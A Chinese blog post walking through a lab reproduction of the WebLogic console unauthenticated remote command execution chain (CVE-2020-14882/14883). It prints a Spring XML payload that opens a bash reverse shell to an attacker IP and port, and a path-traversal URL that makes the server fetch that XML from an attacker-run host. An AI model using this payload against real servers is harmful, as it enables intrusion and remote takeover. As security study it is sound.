# CVE-2020-14882, CVE-2020-14883 Weblogic 管理控制台未授权远程命令执行漏洞 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15743521.html`](https://www.cnblogs.com/peace-and-romance/p/15743521.html)

### 0X00-引言

* * *

最近有点急功心切，想直接变成大佬，难免有点眼高手低，导致现在看一些事情都会变得不爽，总觉得自己才是对的，甚至有点焦虑。心态出了问题，需要调整一下，一口气吃不了一个胖子，欲速则不达，呼气吐气，呼气吐气。

这世界大部分的抒情，都会被认为无病呻吟，能够理解你得了什么病，基本都是知己。

------《云边有个小卖部》

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

CVE-2020-14882 允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883 允许后台任意用户通过 HTTP 协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个 GET 请求在远程 Weblogic 服务器上以未授权的任意用户身份执行命令。

### 0X03-漏洞复现

* * *

##### 01-反弹 shell

POC：

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans 

   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i /dev/tcp/IP/PORT 0>&1]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans> 
```

生成 XML 文件，在 kali 中开启 web 服务

![image-20211228121705639](img/68ee8f5861878f899399d61646008de2.png)

![image-20211228121745028](img/d7979b5c427b5b1e171d4701b0410ee5.png)

通过以下 URL 使 Weblogic 加载 XML

```
http://192.168.234.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.234.135:666/POC.xml") 
```

![image-20211228121556966](img/2f059932583b5a34d73022ac5e193131.png)

成功反弹

![image-20211228121925378](img/dbedfd3d19443c43d1ae5295351b7328.png)

### 0X04-漏洞防御

* * *

禁止访问 console

升级版本

### 0X05-免责声明

* * *

仅供学习参考

### 0X06-参考

* * *

[`github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md`](https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md)